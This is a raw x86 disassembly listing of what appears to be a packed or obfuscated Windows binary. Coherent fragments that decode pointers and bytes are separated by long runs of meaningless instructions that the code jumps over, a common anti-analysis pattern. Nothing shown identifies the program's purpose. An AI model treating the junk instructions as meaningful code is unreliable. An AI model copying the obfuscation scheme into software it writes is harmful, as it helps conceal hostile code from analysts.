  40661a:	add    eax,0x334b673a
  40661f:	ins    DWORD PTR es:[edi],dx
  406620:	shr    DWORD PTR [eax-0x69],1
  406623:	cmp    eax,0xf4f9f1b6
  406628:	fisttp QWORD PTR [ecx+0x60]
  40662b:	cs je  0x40661a
  40662e:	mov    DWORD PTR [eax-0x6b],esp
  406631:	out    dx,al
  406632:	pop    ebp
  406633:	push   ebx
  406634:	(bad)  
  406635:	mov    dh,0x1e
  406637:	inc    ebx
  406638:	jecxz  0x4065d2
  40663a:	push   cs
  40663b:	lods   al,BYTE PTR ss:[esi]
  40663d:	call   0xfb70334b
  406642:	aad    0x90
  406644:	mov    dl,BYTE PTR [ebp+0x588cd458]
  40664a:	outs   dx,DWORD PTR ds:[esi]
  40664b:	out    0x90,eax
  40664d:	imul   edi,DWORD PTR [edi+0x10],0x6a
  406651:	ss sbb cl,0x4c
  406655:	aas    
  406656:	xchg   ecx,eax
  406657:	mov    eax,0x118a5e95
  40665c:	push   edx
  40665d:	inc    ebp
  40665e:	data16 lahf 
  406660:	stos   DWORD PTR es:[edi],eax
  406661:	(bad)  
  406662:	es dec edi
  406665:	and    DWORD PTR fs:[esi+eax*8],edx
  406669:	(bad)  
  40666b:	or     DWORD PTR [edx-0xd],esi
  40666e:	test   eax,0xb046c787
  406673:	push   ds
  406674:	xor    edi,DWORD PTR [ebp+eax*2+0x2]
  406678:	xor    eax,0xce68eb92
  40667d:	es or  al,0xba
  406680:	push   esp
  406681:	test   al,0xff
  406683:	jae    0x4066b5
  406685:	das    
  406686:	jns    0x406616
  406688:	mov    ds:0x62b3f65d,al
  40668d:	push   es
  40668e:	aas    
  40668f:	mov    esp,DWORD PTR [ecx]
  406691:	jmp    0x3f66:0x88afdee0
  406698:	xor    BYTE PTR [ebp-0x54],bl
  40669b:	(bad)  
  40669c:	(bad)  
  40669d:	push   esp
  40669e:	out    dx,eax
  40669f:	mov    ch,0x2
  4066a1:	sbb    eax,0x903b0e3
  4066a6:	and    bh,BYTE PTR [esi-0x3d]
  4066a9:	xchg   DWORD PTR [ecx*1+0x7ae153a8],ecx
  4066b0:	in     eax,dx
  4066b1:	add    ebx,ecx
  4066b3:	test   eax,0x8faa165a
  4066b8:	fnsave [eax+ecx*1+0x5]
  4066bc:	stos   BYTE PTR es:[edi],al
  4066bd:	add    BYTE PTR [eax],al
  4066bf:	add    BYTE PTR [eax-0x17],dl
  4066c2:	daa    
  4066c3:	add    DWORD PTR [eax],eax
  4066c5:	add    BYTE PTR [ebx],ch
  4066c7:	dec    esp
  4066c8:	into   
  4066c9:	hlt    
  4066ca:	jge    0x4066c2
  4066cc:	jge    0x406731
  4066ce:	fnstenv [edi-0x5323b590]
  4066d4:	data16 xor BYTE PTR [ebx+0x27],bh
  4066d8:	jl     0x406756
  4066da:	or     eax,0xb17c7c7f
  4066df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066e0:	sub    BYTE PTR [edx-0x9b34001],al
  4066e6:	inc    esi
  4066e7:	xchg   edi,eax
  4066e8:	and    BYTE PTR [ebx+edi*4+0x1a],cl
  4066ec:	cmp    BYTE PTR [ebx+0x44],dh
  4066ef:	call   0xac3b1162
  4066f4:	in     al,dx
  4066f5:	push   esp
  4066f6:	(bad)  
  4066f8:	push   es
  4066f9:	pop    esi
  4066fa:	xor    bl,BYTE PTR [edx]
  4066fc:	das    
  4066fd:	lods   eax,DWORD PTR ds:[esi]
  4066fe:	mov    cl,0x15
  406700:	aam    0x48
  406702:	push   0x3d233c80
  406707:	pop    esp
  406708:	mov    esp,0xb1a1b4ae
  40670d:	and    BYTE PTR [eax+0x16],0x7c
  406711:	not    ecx
  406713:	daa    
  406714:	inc    esi
  406715:	inc    BYTE PTR [edx+0x7e]
  406718:	loope  0x406751
  40671a:	push   ecx
  40671b:	addr16 pop ecx
  40671d:	fs cmp ch,bl
  406720:	(bad)  
  406721:	sub    DWORD PTR [ebp*8-0x36ad3a1a],ecx
  406728:	push   ecx
  406729:	jle    0x406765
  40672b:	pop    ss
  40672c:	sbb    bl,BYTE PTR [edi-0x47]
  40672f:	and    ch,ch
  406731:	imul   DWORD PTR [esi+0x32]
  406734:	int3   
  406735:	add    ebx,edx
  406737:	xchg   ebx,eax
  406738:	mov    ah,0x23
  40673a:	imul   BYTE PTR [ecx+eax*4-0x5303d480]
  406741:	fs xchg edx,eax
  406743:	ror    DWORD PTR [ebp-0x6],1
  406746:	sub    al,BYTE PTR ds:[eax+eiz*4-0x48]
  40674b:	and    al,BYTE PTR [ebp+0x17]
  40674e:	mov    al,0x3c
  406750:	jno    0x40677a
  406752:	adc    al,0x6f
  406754:	ret    
  406755:	inc    ebx
  406756:	mov    dh,0x3c
  406758:	arpl   bx,di
  40675a:	aam    0xa5
  40675c:	mov    al,ds:0x2db3bc84
  406761:	mov    ds:0x406f8195,eax
  406766:	xor    al,0x8a
  406768:	pop    esi
  406769:	inc    edi
  40676a:	mov    esp,0x924b057e
  40676f:	cmp    BYTE PTR [esi],dh
  406771:	adc    DWORD PTR [edi+ebx*4],ebp
  406774:	(bad)  
  406775:	sbb    BYTE PTR [esp+ebp*1-0x24],dl
  406779:	xchg   DWORD PTR [edx],edi
  40677b:	xchg   esp,eax
  40677c:	mov    ebx,0x2e6a14bc
  406781:	dec    edx
  406782:	scas   al,BYTE PTR es:[edi]
  406783:	call   0x3c727d81
  406788:	cwde   
  406789:	and    dh,dl
  40678b:	retf   0x81f7
  40678e:	cmp    BYTE PTR [ebp+0x6f8954a3],ah
  406794:	pop    ebp
  406795:	adc    eax,0x702f32b5
  40679a:	test   al,0x3f
  40679c:	inc    edi
  40679d:	adc    eax,0x11a9c64d
  4067a2:	test   eax,0xb33e1503
  4067a7:	(bad)  
  4067a8:	das    
  4067a9:	inc    ecx
  4067aa:	and    al,0xd4
  4067ac:	jmp    0x40679c
  4067ae:	cs loopne 0x406778
  4067b1:	jg     0x406758
  4067b3:	or     BYTE PTR [edi],ah
  4067b5:	pusha  
  4067b6:	mov    ds:0x85345fe6,eax
  4067bb:	mov    al,0x41
  4067bd:	sbb    al,0x4c
  4067bf:	int    0xef
  4067c1:	jns    0x406829
  4067c3:	mov    al,ds:0xd4464c26
  4067c8:	sub    DWORD PTR [esi+0x71],esi
  4067cb:	mov    esi,0xe5ddab7a
  4067d0:	or     al,0xf6
  4067d2:	adc    DWORD PTR [edx],edi
  4067d4:	inc    ebp
  4067d5:	inc    ebx
  4067d6:	sub    eax,0xbd5e231c
  4067db:	mov    ecx,0x5cb10d8d
  4067e0:	sub    al,0xc1
  4067e2:	jb     0x4067dc
  4067e4:	xchg   ecx,eax
  4067e5:	mov    ah,BYTE PTR [edx+0x28]
  4067e8:	not    BYTE PTR [ebx]
  4067ea:	fsubrp st(3),st
  4067ec:	(bad)  
  4067ed:	mov    eax,DWORD PTR [ebp-0x10]
  4067f0:	mov    eax,DWORD PTR [eax+0x198]
  4067f6:	jmp    0x406922
  4067fb:	shr    ecx,cl
  4067fd:	dec    esp
  4067fe:	pop    esi
  4067ff:	pop    edx
  406800:	jns    0x4067e7
  406802:	ins    DWORD PTR es:[edi],dx
  406803:	adc    eax,0x15a54fb4
  406808:	dec    ebx
  406809:	div    BYTE PTR [eax+0x7c7c3908]
  40680f:	or     eax,0xa47c7c7f
  406814:	sbb    al,0x67
  406816:	push   esp
  406817:	cmp    BYTE PTR [esi],dl
  406819:	adc    ch,BYTE PTR [edi+0x49e3013e]
  40681f:	jmp    0x9ea0a205
  406824:	int3   
  406825:	cmc    
  406826:	adc    al,0xfd
  406828:	jge    0x40683f
  40682a:	test   DWORD PTR [edx+0x4db33553],esp
  406830:	jno    0x4067ca
  406832:	pop    eax
  406833:	mov    al,0x79
  406835:	cmp    bl,BYTE PTR [ecx+ebp*1-0x4]
  406839:	jle    0x4068af
  40683b:	sbb    eax,eax
  40683d:	shl    BYTE PTR [esi],cl
  40683f:	jo     0x40687f
  406841:	mov    eax,ds:0x3afbca75
  406846:	xchg   ebp,eax
  406847:	xor    al,0x92
  406849:	push   eax
  40684a:	and    BYTE PTR [edi-0x75],al
  40684d:	jb     0x406878
  40684f:	inc    edx
  406850:	mov    ecx,0x97800f1c
  406855:	push   cs
  406856:	test   DWORD PTR [edi+0x24d68236],esi
  40685c:	adc    al,0x6
  40685e:	jbe    0x4068b3
  406860:	in     eax,dx
  406861:	scas   al,BYTE PTR es:[edi]
  406862:	and    DWORD PTR [ebx],0xb72a9490
  406868:	es enter 0x34b5,0x5c
  40686d:	or     eax,DWORD PTR [edx]
  40686f:	div    DWORD PTR [edi+0x7]
  406872:	in     al,0xc6
  406874:	leave  
  406875:	rcr    al,cl
  406877:	cmp    DWORD PTR [edx+ebx*8+0x74],ebp
  40687b:	or     ch,dl
  40687d:	add    al,0xd0
  40687f:	(bad)  
  406880:	loopne 0x406837
  406882:	jnp    0x4068f0
  406884:	add    al,0x89
  406886:	or     eax,0x12521652
  40688b:	setns  ch
  40688e:	xor    ch,BYTE PTR [ebx]
  406890:	push   ebx
  406891:	inc    edi
  406892:	push   ebp
  406893:	and    eax,edx
  406895:	jbe    0x4068e7
  406897:	and    al,0xb1
  406899:	sbb    BYTE PTR [esi],0xab
  40689c:	xchg   DWORD PTR [esi-0x225aba08],esi
  4068a2:	mov    ebp,0xbd790748
  4068a7:	or     DWORD PTR [esi+0x71c94693],0xffffffc5
  4068ae:	push   0xfffffff3
  4068b0:	in     eax,0xc2
  4068b2:	xchg   esp,eax
  4068b3:	test   DWORD PTR [edx+0x7b],edx
  4068b6:	in     al,dx
  4068b7:	aad    0x61
  4068b9:	push   ss
  4068ba:	mov    BYTE PTR [ebx+0x40],0x29
  4068be:	sahf   
  4068bf:	test   al,0x16
  4068c1:	adc    dh,al
  4068c3:	pushf  
  4068c4:	mul    BYTE PTR [eax+0x7b]
  4068c7:	push   0xffffffb6
  4068c9:	and    al,0x80
  4068cb:	fs add eax,0x9540b784
  4068d1:	jns    0x406904
  4068d3:	scas   eax,DWORD PTR es:[edi]
  4068d4:	push   ecx
  4068d5:	call   0x9b96:0xce6c3213
  4068dc:	xor    eax,0x9bd437fe
  4068e1:	out    0xe5,al
  4068e3:	add    eax,DWORD PTR [ebx]
  4068e5:	dec    edi
  4068e6:	jns    0x4068c8
  4068e8:	inc    ebx
  4068e9:	mov    BYTE PTR [eax],dh
  4068eb:	lahf   
  4068ec:	sbb    al,BYTE PTR [edx]
  4068ee:	retf   0xfdf2
  4068f1:	xchg   ebx,eax
  4068f2:	mov    esp,0x35cc04c
  4068f7:	pop    edx
  4068f8:	loop   0x4068ed
  4068fa:	mov    ecx,0x62d0f6ee
  4068ff:	fcmovbe st,st(1)
  406901:	or     BYTE PTR ds:0xf89f136,dh
  406907:	add    BYTE PTR [ebx+0x58],bh
  40690a:	inc    esp
  40690b:	pop    edi
  40690c:	lea    edx,[ecx+ecx*8+0x3e]
  406910:	mov    WORD PTR [ecx+0x19c1fa94],es
  406916:	popa   
  406917:	fucomp st(7)
  406919:	out    0xe9,eax
  40691b:	cld    
  40691c:	out    dx,al
  40691d:	test   BYTE PTR [esi-0x22938],0x30
  406924:	call   0x40101c
  406929:	mov    DWORD PTR [ebp-0x8],eax
  40692c:	cmp    DWORD PTR [ebp-0x8],0x0
  406930:	lea    eax,[ebp+0x4]
  406933:	mov    DWORD PTR [ebp-0x20],eax
  406936:	je     0x406fd6
  40693c:	lea    eax,[ebp-0x18]
  40693f:	push   eax
  406940:	mov    eax,DWORD PTR [ebp-0x2c]
  406943:	xor    eax,esi
  406945:	add    eax,edi
  406947:	push   eax
  406948:	mov    eax,DWORD PTR [ebp-0x1c]
  40694b:	xor    eax,esi
  40694d:	add    eax,edi
  40694f:	push   eax
  406950:	push   DWORD PTR [ebp-0x8]
  406953:	lea    eax,[ebp-0x78]
  406956:	push   eax
  406957:	push   DWORD PTR [ebp-0xc]
  40695a:	push   DWORD PTR [ebp-0x14]
  40695d:	call   0x4055ae
  406962:	test   eax,eax
  406964:	je     0x406abb
  40696a:	lea    eax,[ebp-0x78]
  40696d:	push   eax
  40696e:	mov    eax,DWORD PTR [ebp-0x14]
  406971:	xor    eax,esi
  406973:	add    eax,edi
  406975:	push   eax
  406976:	mov    eax,DWORD PTR [ebp-0x10]
  406979:	add    eax,0xee
  40697e:	push   eax
  40697f:	mov    eax,DWORD PTR [ebp-0x10]
  406982:	mov    eax,DWORD PTR [eax+0x198]
  406988:	push   DWORD PTR [eax]
  40698a:	jmp    0x406ab6
  40698f:	xor    BYTE PTR [ecx-0x12922c70],ch
  406995:	mov    bl,0xa9
  406997:	and    BYTE PTR [esi+eax*2-0x22],ch
  40699b:	test   BYTE PTR [ebp-0x1b],0x90
  40699f:	sbb    DWORD PTR [eax],edi
  4069a1:	jl     0x406a1f
  4069a3:	or     eax,0x1c7c7c7f
  4069a8:	and    bl,BYTE PTR [edx-0x5913480a]
  4069ae:	cmp    DWORD PTR [eax+edi*8+0x6ce51f4a],ecx
  4069b5:	daa    
  4069b6:	or     eax,0xbb669a4
  4069bb:	in     al,dx
  4069bc:	push   ss
  4069bd:	leave  
  4069be:	ror    DWORD PTR [esi],1
  4069c0:	clc    
  4069c1:	in     al,0x2c
  4069c3:	mov    esi,0x7bbaaf62
  4069c8:	pop    ecx
  4069c9:	mov    ds:0xd5bcd3f8,al
  4069ce:	or     eax,0xb30cae42
  4069d3:	int    0x44
  4069d5:	cmp    eax,0x66ca06b5
  4069da:	nop
  4069db:	sbb    eax,0x4cd457b4
  4069e0:	stos   BYTE PTR es:[edi],al
  4069e1:	mov    al,0xb6
  4069e3:	bound  ecx,QWORD PTR [esi+0x4f602ef2]
  4069e9:	add    DWORD PTR [eax+0x1e543aee],0x52
  4069f0:	xchg   esp,eax
  4069f1:	(bad)  
  4069f2:	fisub  WORD PTR [esi+0x76]
  4069f5:	mov    eax,ds:0x1436fc5e
  4069fa:	test   al,0x2
  4069fc:	test   al,0x3f
  4069fe:	jne    0x406a5e
  406a00:	adc    BYTE PTR [eax],ch
  406a02:	mov    ch,0xb0
  406a04:	inc    ecx
  406a05:	add    edx,esp
  406a07:	(bad)  
  406a08:	scas   al,BYTE PTR es:[edi]
  406a09:	leave  
  406a0a:	mov    bl,0x9c
  406a0c:	aas    
  406a0d:	cmp    edx,ecx
  406a0f:	or     eax,0xbce2ea3
  406a14:	ficomp DWORD PTR [edx-0x2bfe390d]
  406a1a:	xchg   ebp,ebx
  406a1c:	mov    edi,0xa6238598
  406a21:	xchg   edx,eax
  406a22:	mov    ah,0x2b
  406a24:	fdiv   QWORD PTR [edx+0x7117a13b]
  406a2a:	dec    esp
  406a2b:	(bad)  
  406a2c:	jp     0x406a15
  406a2e:	outs   dx,BYTE PTR ds:[esi]
  406a2f:	pop    ebx
  406a30:	fs pop eax
  406a32:	pop    eax
  406a33:	add    BYTE PTR [eax],bl
  406a35:	aad    0xc8
  406a37:	in     eax,0xad
  406a39:	mov    esp,0xdd297792
  406a3e:	into   
  406a3f:	call   0x59de:0xc0ccd914
  406a46:	pop    es
  406a47:	push   ebp
  406a48:	ins    DWORD PTR es:[edi],dx
  406a49:	popf   
  406a4a:	mov    WORD PTR [ebx+0x5c08c3f1],gs
  406a50:	pop    ss
  406a51:	pop    ds
  406a52:	rol    DWORD PTR [ebx-0x76],0xf0
  406a56:	add    eax,DWORD PTR [ebp+eax*8-0x28]
  406a5a:	repz pop ss
  406a5c:	sahf   
  406a5d:	and    esi,DWORD PTR [edx-0x780efe2b]
  406a63:	mov    ah,0x7b
  406a65:	or     ch,BYTE PTR [ebp-0x7c]
  406a68:	sbb    eax,0x62a21484
  406a6d:	fmulp  st(7),st
  406a6f:	xchg   eax,ecx
  406a71:	ss int3 
  406a73:	shl    bh,cl
  406a75:	sbb    DWORD PTR [eax+0x4c0b58e5],edi
  406a7b:	int    0x78
  406a7d:	(bad)  
  406a7e:	pop    edi
  406a7f:	cdq    
  406a80:	pop    ds
  406a81:	add    edx,DWORD PTR [ebx-0xe]
  406a84:	push   ebp
  406a85:	or     al,0x69
  406a87:	pop    ecx
  406a88:	push   ebp
  406a89:	lahf   
  406a8a:	test   al,0xcf
  406a8c:	jmp    0x1458:0xb0e0
  406a92:	mov    ch,0x79
  406a94:	or     eax,0xd99bb2af
  406a99:	push   es
  406a9a:	jae    0x406a80
  406a9c:	jns    0x406a77
  406a9e:	dec    eax
  406a9f:	sahf   
  406aa0:	mov    dh,0x9d
  406aa2:	in     eax,dx
  406aa3:	fild   DWORD PTR [esi]
  406aa5:	imul   edi,eax,0x14564ba
  406aab:	or     bh,BYTE PTR [edi+0x6b]
  406aae:	mov    ebx,0x605e074e
  406ab3:	outs   dx,DWORD PTR ds:[esi]
  406ab4:	icebp  
  406ab5:	int3   
  406ab6:	call   0x40101c
  406abb:	mov    ecx,DWORD PTR [ebp-0x1c]
  406abe:	xor    ecx,esi
  406ac0:	mov    eax,0xffcd8d62
  406ac5:	sub    eax,ecx
  406ac7:	jmp    0x406bf3
  406acc:	or     al,0x53
  406ace:	and    al,0x43
  406ad0:	jnp    0x406b2d
  406ad2:	jnp    0x406b27
  406ad4:	gs ins DWORD PTR es:[edi],dx
  406ad6:	push   esp
  406ad7:	and    BYTE PTR [edx+0x164cacc3],al
  406add:	cmp    edi,DWORD PTR [esp+edi*2+0xd]
  406ae1:	jg     0x406b5f
  406ae3:	jl     0x406a99
  406ae5:	mov    ebp,0x8e8d6a56
  406aea:	add    al,BYTE PTR [ecx-0x52]
  406aed:	(bad)  
  406aee:	pop    ebp
  406aef:	mov    eax,ds:0xf0f0f6e7
  406af4:	sbb    al,0xf2
  406af6:	sar    BYTE PTR [edi+0x432f340c],cl
  406afc:	push   ebx
  406afd:	push   edx
  406afe:	xor    al,0x5c
  406b00:	xor    al,0x7f
  406b02:	imul   DWORD PTR [esi+0x34]
  406b05:	stc    
  406b06:	xor    BYTE PTR gs:[edx-0x4d2f28a0],bh
  406b0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b0e:	mov    ebx,ebp
  406b10:	pusha  
  406b11:	imul   esp,DWORD PTR [edi],0xffffffdd
  406b14:	popa   
  406b15:	mov    ebx,DWORD PTR [esi-0x8]
  406b18:	rcl    DWORD PTR [edx],0xf8
  406b1b:	push   0xffffff91
  406b1d:	movlps xmm1,QWORD PTR [edi-0xdbdabdc]
  406b24:	test   eax,0xc57c2415
  406b29:	xchg   ebp,eax
  406b2a:	int3   
  406b2b:	add    DWORD PTR [ecx+ecx*4+0xcf2819],edi
  406b32:	fimul  DWORD PTR [edi]
  406b34:	cmc    
  406b35:	cmp    al,0x36
  406b37:	xchg   ebx,eax
  406b38:	inc    ecx
  406b39:	jmp    0x406af1
  406b3b:	test   al,0xdf
  406b3d:	mov    edi,0x15b0fcb9
  406b42:	sbb    al,0x77
  406b44:	mov    eax,ds:0x54bec2a6
  406b49:	shr    DWORD PTR [eax],cl
  406b4b:	scas   al,BYTE PTR es:[edi]
  406b4c:	clc    
  406b4d:	mov    al,ds:0x69786972
  406b52:	mov    ebx,0xf864af9d
  406b57:	sbb    ecx,DWORD PTR [edx]
  406b59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b5a:	or     esp,DWORD PTR [edi+ebx*1]
  406b5d:	adc    cl,cl
  406b5f:	mov    ch,0x31
  406b61:	sti    
  406b62:	mov    ecx,0x977f78f8
  406b67:	mov    edx,DWORD PTR [ecx+ebx*4]
  406b6a:	mov    ds:0x815e2d3b,eax
  406b6f:	in     eax,dx
  406b70:	jns    0x406b70
  406b72:	sbb    BYTE PTR [ebx],dh
  406b74:	mov    bl,0xae
  406b76:	out    dx,al
  406b77:	fwait
  406b78:	call   FWORD PTR [ebx-0x5f55f1d1]
  406b7e:	out    0x60,eax
  406b80:	jb     0x406bbe
  406b82:	push   ds
  406b83:	loope  0x406bd4
  406b85:	jmp    0x3257:0xc7338d2
  406b8c:	mov    eax,ds:0x3d79b299
  406b91:	push   es
  406b92:	rcr    DWORD PTR [edi+0x19],cl
  406b95:	iret   
  406b96:	ret    
  406b97:	inc    eax
  406b98:	je     0x406b97
  406b9a:	xchg   ebp,eax
  406b9b:	push   esi
  406b9c:	jl     0x406b25
  406b9e:	pop    ebp
  406b9f:	in     eax,dx
  406ba0:	sub    DWORD PTR [esi+0x5183ca96],edx
  406ba6:	dec    ebx
  406ba7:	mov    edx,0xf5aa241c
  406bac:	xchg   ebx,eax
  406bad:	push   edx
  406bae:	lea    esp,[edx]
  406bb0:	mov    dh,0x91
  406bb2:	cmp    BYTE PTR fs:[ebx-0x55],0x58
  406bb7:	loopne 0x406bf4
  406bb9:	push   ds
  406bba:	stos   DWORD PTR es:[edi],eax
  406bbb:	xor    al,0x1d
  406bbd:	out    0x35,al
  406bbf:	xor    eax,edx
  406bc1:	pop    es
  406bc2:	mov    ch,0xc0
  406bc4:	(bad)  
  406bc5:	out    dx,al
  406bc6:	xchg   edx,eax
  406bc7:	jne    0x406c2b
  406bc9:	or     eax,0x9276ed74
  406bce:	xor    al,0xc7
  406bd0:	mov    ch,0x9
  406bd2:	push   esi
  406bd3:	dec    esi
  406bd4:	cmp    DWORD PTR [eax-0x6f0598b5],ebx
  406bda:	adc    ebx,ecx
  406bdc:	and    al,BYTE PTR [ecx]
  406bde:	xchg   ecx,eax
  406bdf:	jecxz  0x406b77
  406be1:	sub    eax,0x9138309f
  406be6:	and    BYTE PTR [esi-0x6453e351],bh
  406bec:	jo     0x406c18
  406bee:	or     eax,0x6323d899
  406bf3:	sub    eax,DWORD PTR [ebp-0x8]
  406bf6:	mov    ecx,DWORD PTR [ebp-0x30]
  406bf9:	add    ecx,eax
  406bfb:	jmp    0x406d27
  406c00:	xchg   ebp,eax
  406c01:	(bad)  
  406c02:	out    0x14,eax
  406c04:	std    
  406c05:	push   esp
  406c06:	gs popf 
  406c08:	repz mov al,ds:0xe8239e75
  406c0e:	sbb    al,0x90
  406c10:	daa    
  406c11:	cmp    bh,BYTE PTR [esp+edi*2+0xd]
  406c15:	jg     0x406c93
  406c17:	jl     0x406c32
  406c19:	xchg   DWORD PTR [edx-0x7d],edx
  406c1c:	ror    BYTE PTR [edx+0x277bfdcd],1
  406c22:	int3   
  406c23:	mov    bh,0xc3
  406c25:	add    al,0x6f
  406c27:	rcr    dh,0xbf
  406c2a:	rcr    BYTE PTR [ebx-0x111f581e],1
  406c30:	(bad)  
  406c31:	mov    BYTE PTR [ebp+0x7853a4a3],bh
  406c37:	in     al,dx
  406c38:	sub    ebx,DWORD PTR [ebp-0x47d923d8]
  406c3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c3f:	out    dx,eax
  406c40:	or     edx,0xf158917a
  406c46:	mov    ?,WORD PTR [ebp-0x42]
  406c49:	xchg   BYTE PTR [edi+0x470279b1],dl
  406c4f:	push   ecx
  406c50:	and    esi,DWORD PTR [eax-0x4f]
  406c53:	call   0xbd8b:0x4a449b3c
  406c5a:	sbb    edi,DWORD PTR [esi]
  406c5c:	aam    0x46
  406c5e:	adc    esi,0xffffffdc
  406c61:	mov    ch,0xe7
  406c63:	loope  0x406cb6
  406c65:	es push ebx
  406c67:	cwde   
  406c68:	and    BYTE PTR [ebx+0x3bde080a],cl
  406c6e:	in     al,0x55
  406c70:	out    dx,eax
  406c71:	iret   
  406c72:	xchg   ebp,eax
  406c73:	add    ebx,DWORD PTR [ebx]
  406c75:	sbb    al,0xab
  406c77:	cs aaa 
  406c79:	or     al,0x69
  406c7b:	rol    DWORD PTR [ebp-0x7c],0x71
  406c7f:	mov    ebx,0x9d2684e7
  406c84:	int3   
  406c85:	adc    eax,0x96d3da35
  406c8a:	aam    0xb
  406c8c:	add    esi,DWORD PTR [edx+ebx*8-0x2107d4f7]
  406c93:	or     DWORD PTR [eax+0x4d],edx
  406c96:	(bad)
  406c99:	push   cs
  406c9a:	jnp    0x406c38
  406c9c:	push   esp
  406c9d:	push   eax
  406c9e:	jno    0x406c89
  406ca0:	call   FWORD PTR [esi+0x17]
  406ca3:	sub    DWORD PTR [eax],0x47
  406ca6:	out    dx,eax
  406ca7:	mov    ds:0xcbe2b19f,al
  406cac:	mov    BYTE PTR [edi-0x52],bl
  406caf:	pushf  
  406cb0:	inc    eax
  406cb1:	push   0x20d0fa96
  406cb6:	xor    al,0x64
  406cb8:	mov    esp,0x4273d0f
  406cbd:	jno    0x406c98
  406cbf:	push   ss
  406cc0:	retf   
  406cc1:	xchg   esp,eax
  406cc2:	out    0x5c,al
  406cc4:	out    0xc2,eax
  406cc6:	push   cs
  406cc7:	loopne 0x406d27
  406cc9:	mov    cl,0xc6
  406ccb:	lods   eax,DWORD PTR ds:[esi]
  406ccc:	mov    ds:0x961c828b,eax
  406cd1:	dec    edi
  406cd2:	in     al,0x54
  406cd4:	test   al,0x64
  406cd6:	mov    ebp,0x588aaa9e
  406cdb:	fwait
  406cdc:	sub    DWORD PTR [ebx-0x364e1e3f],esp
  406ce2:	jmp    0xe637:0xdef571aa
  406ce9:	pop    ebp
  406cea:	adc    DWORD PTR [ecx],0x4f
  406ced:	mov    cl,0x20
  406cef:	mov    eax,0xacb8be2
  406cf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cf5:	(bad)  
  406cf6:	in     al,0xf
  406cf8:	add    bl,BYTE PTR [ebp-0x48]
  406cfb:	sbb    edi,DWORD PTR [ebx]
  406cfd:	rcl    DWORD PTR [ebx+0x1e881dcf],0xb0
  406d04:	mov    bh,BYTE PTR [ebp-0x1b]
  406d07:	pop    esp
  406d08:	xchg   ecx,eax
  406d09:	pop    edx
  406d0a:	xor    esp,DWORD PTR [edx-0x48d5a5e]
  406d10:	sbb    ch,BYTE PTR [esi]
  406d12:	enter  0xc0a8,0x83
  406d16:	push   ecx
  406d17:	jo     0x406cc9
  406d19:	xchg   esi,eax
  406d1a:	push   es
  406d1b:	cmc    
  406d1c:	xchg   ebp,eax
  406d1d:	js     0x406d6c
  406d1f:	fsubr  QWORD PTR [edi]
  406d21:	xor    eax,0x98f4f72e
  406d26:	ror    BYTE PTR [ebx+0x4889f845],0x1
  406d2d:	mov    al,BYTE PTR [ebp-0x1]
  406d30:	mov    ecx,DWORD PTR [ebp-0x8]
  406d33:	xor    al,0x49
  406d35:	sub    al,0x35
  406d37:	mov    BYTE PTR [ecx],al
  406d39:	lea    eax,[ebp-0x8]
  406d3c:	inc    BYTE PTR [eax]
  406d3e:	inc    eax
  406d3f:	push   eax
  406d40:	pop    ecx
  406d41:	dec    ecx
  406d42:	xchg   ecx,edx
  406d44:	dec    BYTE PTR [edx]
  406d46:	push   DWORD PTR [ebp-0x10]
  406d49:	mov    eax,ds:0x44525c
  406d4e:	mov    eax,DWORD PTR [eax]
  406d50:	push   DWORD PTR [eax]
  406d52:	lea    eax,ds:0x445278
  406d58:	jmp    0x406e84
  406d5d:	scas   eax,DWORD PTR es:[edi]
  406d5e:	stos   DWORD PTR es:[edi],eax
  406d5f:	fs pop ds
  406d61:	js     0x406d46
  406d63:	addr16 mov ebx,0xcd1c5374
  406d69:	xchg   ebx,eax
  406d6a:	cmp    dl,BYTE PTR [eax]
  406d6c:	mov    edi,0x7c7c3d34
  406d71:	or     eax,0xb27c7c7f
  406d76:	test   BYTE PTR [ebx],0x7
  406d79:	popa   
  406d7a:	repnz ficomp WORD PTR [eax+esi*1]
  406d7e:	pop    ds
  406d7f:	test   eax,0xb0a58e81
  406d84:	dec    esp
  406d85:	std    
  406d86:	aad    0xdb
  406d88:	shl    BYTE PTR [ecx],0x26
  406d8b:	mov    WORD PTR [ecx-0x40],ds
  406d8e:	pop    edi
  406d8f:	and    al,0x9
  406d91:	int3   
  406d92:	and    ch,BYTE PTR [ecx-0x7e]
  406d95:	ss iret 
  406d97:	mov    ebp,0xf8d5dc37
  406d9c:	shr    DWORD PTR [edx*8+0x2b0defb],cl
  406da3:	add    eax,0xe0bb4015
  406da8:	fwait
  406da9:	sti    
  406daa:	out    0x4c,al
  406dac:	and    cl,BYTE PTR [eax+0x62]
  406daf:	(bad)  
  406db0:	out    dx,al
  406db1:	mov    edi,0x9f253dcd
  406db6:	and    eax,0x562bf0ae
  406dbb:	cli    
  406dbc:	mov    al,ds:0x3a42e937
  406dc1:	les    ebx,FWORD PTR [eax]
  406dc3:	mov    ch,0x49
  406dc5:	rol    DWORD PTR [ecx-0x74],1
  406dc8:	aaa    
  406dc9:	push   DWORD PTR [ebx+0x23db5f5f]
  406dcf:	mov    ecx,esi
  406dd1:	xchg   esp,eax
  406dd2:	shl    BYTE PTR [esi+0x7c4ca432],0x22
  406dd9:	rcl    esp,1
  406ddb:	aad    0xa
  406ddd:	mov    al,ds:0xd3d10920
  406de2:	pop    edi
  406de3:	cmp    al,0xcd
  406de5:	push   eax
  406de6:	xor    BYTE PTR [eax+0x1180b0b9],dh
  406dec:	lea    ebp,[edx]
  406dee:	jbe    0x406e6b
  406df0:	sbb    al,0x2a
  406df2:	jb     0x406e6a
  406df4:	jo     0x406d81
  406df6:	outs   dx,BYTE PTR ds:[esi]
  406df7:	rol    BYTE PTR [ecx-0x2a],0x18
  406dfb:	xor    al,0xa4
  406dfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dfe:	mov    ebx,0x9928b3de
  406e03:	ins    DWORD PTR es:[edi],dx
  406e04:	ficom  WORD PTR [edi+0x5227985f]
  406e0a:	das    
  406e0b:	jg     0x406db5
  406e0d:	and    esi,eax
  406e0f:	mov    edi,DWORD PTR [esi-0x1a]
  406e12:	mov    bh,0x69
  406e14:	mov    ecx,0xf694c5bd
  406e19:	(bad)  
  406e1a:	mov    eax,0xcb3501ee
  406e1f:	and    eax,0x59da3b68
  406e24:	mov    fs,WORD PTR [ebp-0x61]
